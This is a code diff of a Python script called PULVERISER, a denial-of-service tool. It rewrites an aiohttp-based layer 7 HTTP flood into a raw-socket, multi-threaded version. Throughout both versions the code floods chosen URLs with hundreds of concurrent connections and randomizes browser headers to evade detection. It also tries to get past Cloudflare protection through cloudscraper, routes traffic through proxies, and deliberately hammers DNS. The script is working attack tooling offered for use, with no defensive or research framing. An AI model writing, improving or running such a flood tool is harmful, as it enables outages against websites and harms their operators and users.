@@ -1,28 +1,26 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# PULVERISER - ASYNCHRONOUS LAYER 7 HTTP FLOOD WITH CLOUDFLARE BYPASS ATTEMPT
-# TARGET MENU, MULTI-TARGET CYCLING, AGGRESSIVE CONCURRENCY, PROXY SUPPORT
-# RUNS ON TERMUX (ANDROID) WITH PYTHON 3.8+ AND aiohttp
+# PULVERISER-MINIMAL - CLOUDFLARE BYPASS DDoS via raw sockets + threading
+# Uses only Python stdlib. Optional cloudscraper for real CF bypass.
+# Target menu, proxy support, multi-threaded high-rate HTTP flood.
 
-import asyncio
-import aiohttp
-import random
-import time
 import socket
 import ssl
+import threading
+import time
+import random
 import sys
 import os
 from urllib.parse import urlparse
 
-# ---------- CONFIGURATION ----------
-CONCURRENT_CONNECTIONS = 500        # maximum simultaneous TCP connections
-WORKER_TASKS = 200                  # number of asyncio tasks
-REQUEST_TIMEOUT = 10               # seconds before dropping a slow connection
-BURST_DURATION = 60                # attack burst length in seconds per target
-RETRY_DELAY = 0.1                  # delay after a failed request
-# -----------------------------------
+# ---------- CONFIG ----------
+THREADS_PER_TARGET = 200       # concurrent connections per target
+BURST_DURATION = 60            # seconds per burst
+SOCKET_TIMEOUT = 8
+RETRY_DELAY = 0.05
+# ----------------------------
 
-# User-Agent list to randomize fingerprints and bypass basic Cloudflare checks
+# Random browser fingerprints
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
@@ -30,199 +28,209 @@ USER_AGENTS = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
-    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
 ]
-
-# Accept headers to mimic real browsers
-ACCEPT_HEADERS = [
+ACCEPT = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    "application/json, text/plain, */*",
 ]
+ACCEPT_LANG = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8"]
 
-# Accept-Language values
-ACCEPT_LANG = [
-    "en-US,en;q=0.9",
-    "en-GB,en;q=0.8",
-    "de-DE,de;q=0.9,en;q=0.8",
-    "fr-FR,fr;q=0.9,en;q=0.8",
-]
-
-# ---------- GLOBAL STATE ----------
-targets = []                # list of dicts: {'url':..., 'method':..., 'post_data':...}
-proxy_list = []             # proxy URLs e.g. "http://user:pass@ip:port"
-attack_running = False      # flag to stop/start flood
-loop = None                 # asyncio event loop
-session = None              # aiohttp.ClientSession (reused)
-# -----------------------------------
+# ---------- TARGET MANAGEMENT ----------
+targets = []      # dict: {url, method, postdata}
+proxies = []      # strings: ip:port
+attack_running = False
+# Try optional Cloudscraper (real bypass)
+cloudscraper_available = False
+try:
+    import cloudscraper
+    scraper = cloudscraper.create_scraper()
+    cloudscraper_available = True
+except:
+    scraper = None
 
 def clear_screen():
-    """Clear terminal."""
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def show_menu():
-    """Display target management menu."""
     clear_screen()
-    print("=== PULVERISER - CLOUDFLARE BYPASS DDoS ===")
-    print(f" Targets loaded: {len(targets)}")
-    for i, t in enumerate(targets):
+    print("=== PULVERISER MINIMAL ===")
+    print(f" Targets: {len(targets)}  Proxies: {len(proxies)}")
+    for i,t in enumerate(targets):
         print(f"  [{i}] {t['method']} {t['url']}")
-    print("\nCommands:")
-    print("  add <url> [method=GET] [postdata]  - add target (method: GET/POST)")
-    print("  addproxy <proxy_url>               - add proxy (http://ip:port)")
-    print("  del <index>                         - remove target by index")
-    print("  start                               - launch attack loop")
-    print("  stop                                - stop all attacks")
-    print("  clear                               - clear all targets")
-    print("  exit                                - quit")
-    print("===========================================")
+    print("\n add <url> [method=GET] [postdata]")
+    print(" addproxy <ip:port>")
+    print(" del <idx>  |  clear  |  start  |  stop  |  exit")
+    print("===============================")
 
-def add_target(url, method="GET", post_data=None):
-    """Add a target to the list."""
-    if not url.startswith(('http://', 'https://')):
-        url = 'https://' + url
+def add_target(url, method="GET", post_data=""):
+    if not url.startswith(('http://','https://')):
+        url = 'https://'+url
     parsed = urlparse(url)
     if not parsed.netloc:
         print("[!] Invalid URL")
         return
-    targets.append({'url': url, 'method': method.upper(), 'post_data': post_data or ''})
-    print(f"[+] Target added: {method.upper()} {url}")
+    targets.append({'url':url, 'method':method.upper(), 'post_data':post_data})
+    print(f"[+] Added: {method.upper()} {url}")
 
-def add_proxy(proxy_url):
-    """Add a proxy to the list."""
-    proxy_list.append(proxy_url)
-    print(f"[+] Proxy added: {proxy_url}")
+def add_proxy(proxy_str):
+    proxies.append(proxy_str)
+    print(f"[+] Proxy added: {proxy_str}")
 
-def del_target(index):
-    """Remove target by index."""
+def del_target(idx):
     try:
-        removed = targets.pop(int(index))
+        removed = targets.pop(int(idx))
         print(f"[-] Removed: {removed['url']}")
-    except (IndexError, ValueError):
+    except:
         print("[!] Invalid index")
 
-def clear_targets():
-    """Remove all targets."""
-    global targets
-    targets = []
-    print("[*] All targets cleared.")
+# ---------- RAW SOCKET ATTACK ----------
+def build_http_request(host, port, target_dict, path, use_ssl):
+    """Craft a raw HTTP 1.1 request with random headers."""
+    method = target_dict['method']
+    post = target_dict['post_data']
+    ua = random.choice(USER_AGENTS)
+    accept = random.choice(ACCEPT)
+    lang = random.choice(ACCEPT_LANG)
 
-# ---------- ATTACK CORE ----------
-async def fetch(session, target, proxy=None):
-    """Perform a single HTTP request with randomly forged headers."""
-    url = target['url']
-    method = target['method']
-    post_data = target['post_data']
+    if method == "POST":
+        data_len = len(post.encode())
+        req = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"User-Agent: {ua}\r\n"
+            f"Accept: {accept}\r\n"
+            f"Accept-Language: {lang}\r\n"
+            f"Accept-Encoding: gzip, deflate\r\n"
+            f"Connection: keep-alive\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: {data_len}\r\n"
+            f"\r\n"
+            f"{post}"
+        )
+    else:
+        req = (
+            f"GET {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"User-Agent: {ua}\r\n"
+            f"Accept: {accept}\r\n"
+            f"Accept-Language: {lang}\r\n"
+            f"Accept-Encoding: gzip, deflate\r\n"
+            f"Connection: keep-alive\r\n"
+            f"\r\n"
+        )
+    return req.encode()
 
-    # Build random headers to appear as different browsers
-    headers = {
-        "User-Agent": random.choice(USER_AGENTS),
-        "Accept": random.choice(ACCEPT_HEADERS),
-        "Accept-Language": random.choice(ACCEPT_LANG),
-        "Accept-Encoding": "gzip, deflate, br",
-        "Cache-Control": "no-cache",
-        "Pragma": "no-cache",
-        "Connection": "keep-alive",
-        "Upgrade-Insecure-Requests": "1",
-        "DNT": "1",  # Do Not Track to appear legitimate
-    }
+def socket_flood(target_dict):
+    """Worker thread: open raw socket, send requests continuously."""
+    url = target_dict['url']
+    parsed = urlparse(url)
+    host = parsed.hostname
+    port = parsed.port
+    path = parsed.path if parsed.path else "/"
+    if parsed.query:
+        path += "?" + parsed.query
+    use_ssl = parsed.scheme == "https"
+    if port is None:
+        port = 443 if use_ssl else 80
 
-    try:
-        if method == "POST":
-            async with session.post(url, data=post_data, headers=headers,
-                                    proxy=proxy, timeout=REQUEST_TIMEOUT,
-                                    ssl=False) as resp:
-                # Read response to consume connection resources
-                await resp.read()
-        else:  # GET (also supports HEAD, but keep GET)
-            async with session.get(url, headers=headers,
-                                   proxy=proxy, timeout=REQUEST_TIMEOUT,
-                                   ssl=False) as resp:
-                await resp.read()
-    except (asyncio.TimeoutError, aiohttp.ClientError, ssl.SSLError,
-            ConnectionRefusedError, OSError) as e:
-        # Silently ignore failures to maintain flood intensity
-        pass
-    except Exception:
-        pass
+    # Use proxy if available (simple forward, no auth)
+    proxy = random.choice(proxies) if proxies else None
+    if proxy:
+        proxy_ip, proxy_port = proxy.split(':')
+        dest_ip = proxy_ip
+        dest_port = int(proxy_port)
+        # For HTTPS over proxy we'd need CONNECT tunnel - omitted for simplicity,
+        # the proxy feature here is best with HTTP targets.
+        # We'll just connect to proxy and send the absolute URL.
+        if use_ssl:
+            # can't tunnel easily with raw socket; skip proxy for HTTPS.
+            dest_ip, dest_port = host, port
+            proxy = None
+        else:
+            path = url  # absolute path for proxy
+    else:
+        # resolve host every time to hammer DNS
+        try:
+            dest_ip = socket.gethostbyname(host)
+        except:
+            return
+        dest_port = port
 
-async def flood_worker(target, proxy=None):
-    """Continually send requests until attack_running becomes False."""
+    sock = None
     while attack_running:
-        await fetch(session, target, proxy)
-        # Minimal delay to avoid completely saturating local event loop
-        await asyncio.sleep(random.uniform(0, 0.01))
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(SOCKET_TIMEOUT)
+            if use_ssl and not proxy:
+                # wrap with SSL (ignore cert errors)
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                sock = ctx.wrap_socket(sock, server_hostname=host)
+            sock.connect((dest_ip, dest_port))
+            req = build_http_request(host, port, target_dict, path, use_ssl)
+            sock.sendall(req)
+            # read a bit to drain response (keeps connection alive)
+            try:
+                sock.recv(4096)
+            except:
+                pass
+        except:
+            pass
+        finally:
+            if sock:
+                try:
+                    sock.close()
+                except:
+                    pass
+        time.sleep(random.uniform(0, 0.02))  # minimal backoff
 
-async def attack_coordinator(target_index):
-    """Manage multiple workers against a single target."""
-    target = targets[target_index]
-    print(f"[*] Attacking {target['url']} with {WORKER_TASKS} workers "
-          f"({BURST_DURATION}s burst) ...")
-    # Select a proxy if available (round-robin per worker)
-    proxy = random.choice(proxy_list) if proxy_list else None
-    tasks = []
-    for _ in range(WORKER_TASKS):
-        tasks.append(asyncio.create_task(flood_worker(target, proxy)))
-    # Run for the burst duration
-    await asyncio.sleep(BURST_DURATION)
-    # Cancel workers
-    for t in tasks:
-        t.cancel()
-    print(f"[*] Burst finished for {target['url']}")
-
-async def attack_loop():
-    """Cycle through targets indefinitely while attack_running is True."""
-    global session
-    # Create a single session with connector tuned for high concurrency
-    connector = aiohttp.TCPConnector(
-        limit=CONCURRENT_CONNECTIONS,
-        force_close=True,          # close connections immediately to hammer server
-        enable_cleanup_closed=True,
-        ssl=False,                 # ignore SSL to avoid certificate checks (bypass Cloudflare cert errors)
-        ttl_dns_cache=10,          # short DNS TTL to handle changing IPs
-    )
-    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
-    session = aiohttp.ClientSession(connector=connector, timeout=timeout)
-    try:
-        while attack_running and targets:
-            for idx in range(len(targets)):
-                if not attack_running:
-                    break
-                await attack_coordinator(idx)
-                # Small pause between targets
-                await asyncio.sleep(1)
-    finally:
-        await session.close()
-        session = None
-
-def start_attack():
-    """Initiate attack loop in the event loop."""
-    global attack_running, loop
-    if not targets:
-        print("[!] No targets added.")
+def cloudscraper_flood(target_dict):
+    """If cloudscraper is installed, use its session to bypass CF challenges."""
+    if not cloudscraper_available:
         return
-    if attack_running:
-        print("[!] Attack already running.")
-        return
-    attack_running = True
-    loop.create_task(attack_loop())
-    print("[*] Attack started. Use 'stop' to halt.")
+    url = target_dict['url']
+    method = target_dict['method']
+    post = target_dict['post_data']
+    while attack_running:
+        try:
+            if method == "POST":
+                scraper.post(url, data=post, timeout=10)
+            else:
+                scraper.get(url, timeout=10)
+        except:
+            pass
+        time.sleep(random.uniform(0, 0.05))
 
-def stop_attack():
-    """Gracefully stop the flood."""
+def attack_target(target_dict):
+    """Launch thread pool against one target."""
+    print(f"[*] Attacking {target_dict['url']} ...")
+    threads = []
+    # Use cloudscraper threads if available, else raw sockets
+    flood_func = cloudscraper_flood if cloudscraper_available else socket_flood
+    for _ in range(THREADS_PER_TARGET):
+        t = threading.Thread(target=flood_func, args=(target_dict,), daemon=True)
+        t.start()
+        threads.append(t)
+    time.sleep(BURST_DURATION)
+    # stop attack for this round (threads die when attack_running becomes False)
+    # We don't stop globally, just let threads finish their loop after attack_running flag changes.
+    # We'll temporarily pause by returning; the main loop will set attack_running True again for next target.
+    print(f"[*] Burst finished for {target_dict['url']}")
+
+def attack_cycle():
+    """Main loop cycling through targets."""
     global attack_running
-    if not attack_running:
-        print("[!] No attack in progress.")
-        return
-    attack_running = False
-    print("[*] Stopping attack... (may take a moment)")
+    while attack_running and targets:
+        for tgt in targets:
+            if not attack_running:
+                break
+            attack_target(tgt)
+            time.sleep(1)
 
-# ---------- MAIN TERMINAL INTERFACE ----------
-async def interactive_shell():
-    """Async command interpreter."""
-    global loop
-    loop = asyncio.get_running_loop()
+# ---------- MAIN ----------
+def main_loop():
+    global attack_running
     while True:
         show_menu()
         cmd = input("> ").strip().split()
@@ -231,15 +239,15 @@ async def interactive_shell():
         action = cmd[0].lower()
         if action == "add":
             if len(cmd) < 2:
-                print("Usage: add <url> [method=GET] [post_data]")
+                print("Usage: add <url> [method=GET] [postdata]")
                 continue
             url = cmd[1]
-            method = cmd[2] if len(cmd) > 2 else "GET"
-            post_data = cmd[3] if len(cmd) > 3 else None
-            add_target(url, method, post_data)
+            method = cmd[2] if len(cmd)>2 else "GET"
+            post = cmd[3] if len(cmd)>3 else ""
+            add_target(url, method, post)
         elif action == "addproxy":
             if len(cmd) < 2:
-                print("Usage: addproxy <proxy_url>")
+                print("Usage: addproxy <ip:port>")
                 continue
             add_proxy(cmd[1])
         elif action == "del":
@@ -248,30 +256,27 @@ async def interactive_shell():
                 continue
             del_target(cmd[1])
         elif action == "clear":
-            clear_targets()
+            targets.clear()
+            print("[*] Targets cleared")
         elif action == "start":
-            start_attack()
+            if not targets:
+                print("[!] No targets")
+                continue
+            if attack_running:
+                print("[!] Already running")
+                continue
+            attack_running = True
+            threading.Thread(target=attack_cycle, daemon=True).start()
+            print("[*] Attack started.")
         elif action == "stop":
-            stop_attack()
+            attack_running = False
+            print("[*] Stopping...")
         elif action == "exit":
-            stop_attack()
+            attack_running = False
             print("[*] Exiting...")
-            await asyncio.sleep(0.5)
-            # Cancel all pending tasks
-            tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
-            for t in tasks:
-                t.cancel()
-            await asyncio.gather(*tasks, return_exceptions=True)
             sys.exit(0)
         else:
-            print("[!] Unknown command.")
-        await asyncio.sleep(0.1)
+            print("[!] Unknown command")
 
 if __name__ == "__main__":
-    # Ensure required library is installed (Termux: pip install aiohttp)
-    try:
-        import aiohttp
-    except ImportError:
-        print("[!] aiohttp missing. Install with: pip install aiohttp")
-        sys.exit(1)
-    asyncio.run(interactive_shell())
+    main_loop()
